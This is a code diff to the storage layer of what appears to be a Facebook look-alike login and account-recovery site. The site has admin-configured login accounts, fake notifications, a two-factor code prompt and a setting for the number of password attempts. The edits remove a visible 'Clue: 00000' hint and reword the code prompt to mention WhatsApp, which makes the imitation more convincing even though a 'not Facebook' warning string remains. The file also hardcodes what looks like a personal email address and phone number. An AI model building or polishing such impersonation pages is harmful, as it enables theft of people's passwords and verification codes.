@@ -464,16 +464,37 @@ export const storage = {
     return true;
   },
 
+  reorderUsers(orderedIds) {
+    if (!Array.isArray(orderedIds)) return this.getUsers();
+    const store = readStore();
+    const existing = store.users || [];
+    const idMap = new Map(existing.map((u) => [u.id, u]));
+    const reordered = [];
+    for (const id of orderedIds) {
+      if (idMap.has(id)) {
+        reordered.push(idMap.get(id));
+        idMap.delete(id);
+      }
+    }
+    // Append any remaining users
+    for (const u of idMap.values()) {
+      reordered.push(u);
+    }
+    store.users = reordered;
+    writeStore(store);
+    return reordered;
+  },
+
   // FIRST PAGE ACCOUNTS
   getFirstPageAccounts() {
     const users = this.getUsers();
-    const desktopAccounts = users.filter((u) => u.showOnDesktopLogin);
-    const mobileAccounts = users.filter((u) => u.showOnMobileLogin);
+    const desktopAccounts = users.filter((u) => u.showOnDesktopLogin !== false);
+    const mobileAccounts = users.filter((u) => u.showOnMobileLogin !== false);
 
-    // Fallbacks if none are flagged
+    // Maintain ordered accounts matching admin sequence across both desktop and mobile
     return {
-      desktopAccounts: desktopAccounts.length > 0 ? desktopAccounts : users.slice(0, 3),
-      mobileAccounts: mobileAccounts.length > 0 ? mobileAccounts : users.slice(0, 2),
+      desktopAccounts: desktopAccounts.length > 0 ? desktopAccounts : users,
+      mobileAccounts: mobileAccounts.length > 0 ? mobileAccounts : (desktopAccounts.length > 0 ? desktopAccounts : users),
     };
   },
 
@@ -670,16 +691,27 @@ export const storage = {
 
   createNotification(notifData) {
     const store = readStore();
+    const actorName = typeof notifData.actorName === 'string'
+      ? notifData.actorName
+      : (typeof notifData.userName === 'string'
+        ? notifData.userName
+        : (typeof notifData.user === 'object' && typeof notifData.user?.name === 'string'
+          ? notifData.user.name
+          : 'Facebook Member'));
+    const actorAvatar = typeof notifData.actorAvatar === 'string'
+      ? notifData.actorAvatar
+      : (typeof notifData.avatar === 'string'
+        ? notifData.avatar
+        : (typeof notifData.user === 'object' && typeof notifData.user?.avatar === 'string'
+          ? notifData.user.avatar
+          : 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=300&q=80'));
     const newNotif = {
       id: 'notif_' + Date.now(),
       user: {
-        name: notifData.actorName || notifData.userName || 'Facebook Member',
-        avatar:
-          notifData.actorAvatar ||
-          notifData.userAvatar ||
-          'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=300&q=80',
+        name: actorName,
+        avatar: actorAvatar,
       },
-      action: notifData.action || 'reacted to your post',
+      action: typeof notifData.action === 'string' ? notifData.action : 'interacted with your profile',
       time: 'Just now',
       read: false,
       icon: notifData.icon || 'heart',
@@ -710,16 +742,17 @@ export const storage = {
   getRecoverySettings() {
     const store = readStore();
     return store.recoverySettings || {
+      maxPasswordTrials: 3,
       defaultEmail: 'ademt0614@gmail.com',
       defaultPhone: '+251990039392',
       countdownTime: '(00:36)',
       cardDisplayFallback: 'email', // 'email' | 'phone'
-      twoFactorTitle: 'Check your text messages',
+      twoFactorTitle: 'Check your WhatsApp messages',
       twoFactorSubtitle: 'Enter the code that we sent to your mobile number.',
-      twoFactorTimer: '00:52',
+      twoFactorTimer: '02:00',
       twoFactorChannel: 'sms',
       twoFactorExpectedCode: '00000',
-      twoFactorPlaceholder: 'Code (Clue: 00000)',
+      twoFactorPlaceholder: 'Enter a code',
       twoFactorWarning: '⚠️ Notice: This is not Facebook. Do not enter real credentials or personal information.',
     };
   },
@@ -728,12 +761,14 @@ export const storage = {
     const store = readStore();
     store.recoverySettings = {
       ...(store.recoverySettings || {
+        maxPasswordTrials: 3,
         defaultEmail: 'ademt0614@gmail.com',
         defaultPhone: '+251990039392',
         countdownTime: '(00:36)',
         cardDisplayFallback: 'email',
       }),
       ...settings,
+      maxPasswordTrials: settings.maxPasswordTrials !== undefined ? Math.max(1, parseInt(settings.maxPasswordTrials, 10) || 3) : (store.recoverySettings?.maxPasswordTrials || 3),
       updatedAt: new Date().toISOString(),
     };
     writeStore(store);
